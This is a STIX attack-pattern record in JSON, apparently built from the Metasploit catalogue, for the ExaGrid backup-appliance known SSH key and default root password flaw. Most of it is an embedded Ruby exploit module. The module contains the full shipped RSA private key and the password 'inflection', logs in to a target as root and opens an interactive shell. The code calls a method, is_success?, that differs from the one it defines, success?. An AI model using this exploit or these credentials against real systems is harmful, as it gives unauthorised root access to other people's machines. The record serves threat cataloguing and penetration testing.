{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8cb964fd-0ec7-4eea-873d-2ec68c600f29",
    "created": "2024-08-14T16:58:02.111848Z",
    "modified": "2024-08-14T16:58:02.111852Z",
    "name": "ExaGrid Known SSH Key and Default Password",
    "description": " ExaGrid ships a public/private key pair on their backup appliances to allow passwordless authentication to other ExaGrid appliances.  Since the private key is easily retrievable, an attacker can use it to gain unauthorized remote access as root. Additionally, this module will attempt to use the default password for root, 'inflection'.  'Platform' => 'unix' 'Arch' => ARCH_CMD 'Privileged' => true 'Targets' => [ [ 'Universal', {} ] ] 'Payload' => { 'Compat' => { 'PayloadType' => 'cmd_interact' 'ConnectionType' => 'find'  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/exagrid_known_privkey.rb",
            "external_id": "exagrid_known_privkey.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2016/04/07/r7-2016-04-exagrid-backdoor-ssh-keys-and-hardcoded-credentials"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'ExaGrid Known SSH Key and Default Password',\n          'Description' => %q{\n            ExaGrid ships a public/private key pair on their backup appliances to\n            allow passwordless authentication to other ExaGrid appliances.  Since\n            the private key is easily retrievable, an attacker can use it to gain\n            unauthorized remote access as root. Additionally, this module will\n            attempt to use the default password for root, 'inflection'.\n          },\n          'Platform' => 'unix',\n          'Arch' => ARCH_CMD,\n          'Privileged' => true,\n          'Targets' => [ [ 'Universal', {} ] ],\n          'Payload' => {\n            'Compat' => {\n              'PayloadType' => 'cmd_interact',\n              'ConnectionType' => 'find'\n            }\n          },\n          'Author' => ['egypt'],\n          'License' => MSF_LICENSE,\n          'References' => [\n            [ 'CVE', '2016-1560' ], # password\n            [ 'CVE', '2016-1561' ], # private key\n            [ 'URL', 'https://www.rapid7.com/blog/post/2016/04/07/r7-2016-04-exagrid-backdoor-ssh-keys-and-hardcoded-credentials' ]\n          ],\n          'DisclosureDate' => '2016-04-07',\n          'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'Reliability' => [REPEATABLE_SESSION],\n            'SideEffects' => []\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        # Since we don't include Tcp, we have to register this manually\n        Opt::RHOST(),\n        Opt::RPORT(22)\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  # helper methods that normally come from Tcp\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def do_login(ssh_options)\n    begin\n      ssh_socket = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh_socket = Net::SSH.start(rhost, 'root', ssh_options)\n      end\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    end\n\n    if ssh_socket\n\n      # Create a new session from the socket, then dump it.\n      conn = Net::SSH::CommandStream.new(ssh_socket)\n      ssh_socket = nil\n\n      return conn\n    else\n      return false\n    end\n  end\n\n  # Ghetto hack to prevent the shell detection logic from hitting false\n  # negatives due to weirdness with ssh sockets. We already know it's a shell\n  # because auth succeeded by this point, so no need to do the check anyway.\n  module TrustMeItsAShell\n    def _check_shell(*_args)\n      true\n    end\n  end\n\n  def exploit\n    payload_instance.extend(TrustMeItsAShell)\n\n    ssh_options = ssh_client_defaults.merge({\n      auth_methods: ['publickey'],\n      key_data: [ key_data ],\n      port: rport\n    })\n    ssh_options.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    conn = do_login(ssh_options)\n\n    unless is_success?(conn, true)\n      ssh_options[:auth_methods] = ['password']\n      ssh_options[:password] = 'inflection'\n      ssh_options.delete(:key_data)\n      conn = do_login(ssh_options)\n      is_success?(conn, false)\n    end\n  end\n\n  def success?(conn, key_based)\n    if conn\n      print_good 'Successful login'\n      service_data = {\n        address: rhost,\n        port: rport,\n        protocol: 'tcp',\n        service_name: 'ssh',\n        workspace_id: myworkspace_id\n      }\n      credential_data = {\n        username: 'root',\n        private_type: (key_based ? :ssh_key : :password),\n        private_data: (key_based ? key_data : 'inflection'),\n        origin_type: :service,\n        module_fullname: fullname\n      }.merge(service_data)\n\n      core = create_credential(credential_data)\n      login_data = {\n        core: core,\n        last_attempted: Time.now\n      }.merge(service_data)\n\n      create_credential_login(login_data)\n\n      handler(conn.lsock)\n      true\n    else\n      false\n    end\n  end\n\n  def key_data\n    <<~EOF\n      -----BEGIN RSA PRIVATE KEY-----\n      MIICWAIBAAKBgGdlD7qeGU9f8mdfmLmFemWMnz1tKeeuxKznWFI+6gkaagqjAF10\n      hIruzXQAik7TEBYZyvw9SvYU6MQFsMeqVHGhcXQ5yaz3G/eqX0RhRDn5T4zoHKZa\n      E1MU86zqAUdSXwHDe3pz5JEoGl9EUHTLMGP13T3eBJ19MAWjP7Iuji9HAgElAoGA\n      GSZrnBieX2pdjsQ55/AJA/HF3oJWTRysYWi0nmJUmm41eDV8oRxXl2qFAIqCgeBQ\n      BWA4SzGA77/ll3cBfKzkG1Q3OiVG/YJPOYLp7127zh337hhHZyzTiSjMPFVcanrg\n      AciYw3X0z2GP9ymWGOnIbOsucdhnbHPuSORASPOUOn0CQQC07Acq53rf3iQIkJ9Y\n      iYZd6xnZeZugaX51gQzKgN1QJ1y2sfTfLV6AwsPnieo7+vw2yk+Hl1i5uG9+XkTs\n      Ry45AkEAkk0MPL5YxqLKwH6wh2FHytr1jmENOkQu97k2TsuX0CzzDQApIY/eFkCj\n      QAgkI282MRsaTosxkYeG7ErsA5BJfwJAMOXYbHXp26PSYy4BjYzz4ggwf/dafmGz\n      ebQs+HXa8xGOreroPFFzfL8Eg8Ro0fDOi1lF7Ut/w330nrGxw1GCHQJAYtodBnLG\n      XLMvDHFG2AN1spPyBkGTUOH2OK2TZawoTmOPd3ymK28LriuskwxrceNb96qHZYCk\n      86DC8q8p2OTzYwJANXzRM0SGTqSDMnnid7PGlivaQqfpPOx8MiFR/cGr2dT1HD7y\n      x6f/85mMeTqamSxjTJqALHeKPYWyzeSnUrp+Eg==\n      -----END RSA PRIVATE KEY-----\n    EOF\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-04-07"
}